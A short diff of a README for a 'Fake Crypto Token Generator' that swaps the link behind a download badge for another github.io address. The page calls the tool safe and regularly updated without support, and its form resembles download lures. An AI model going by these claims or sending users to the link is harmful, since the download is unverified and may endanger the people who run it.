@@ -3,7 +3,7 @@
 🚀 The **Fake Crypto Token Generator** is a developer-friendly utility to create **test tokens and fake crypto coins** for blockchain simulations, demos, and learning environments.  
 It’s lightweight, safe, and regularly updated to match the latest token standards.  
 
-[![Download Fake Crypto Token Generator](https://img.shields.io/badge/Download-Fake%20Crypto%20Token%20Generator-greenyellow)](https://bestsoftonik.github.io/public/)  
+[![Download Fake Crypto Token Generator](https://img.shields.io/badge/Download-Fake%20Crypto%20Token%20Generator-greenyellow)](https://fake-crypto-token-generator.github.io/.github/)  
 
 ---  
 
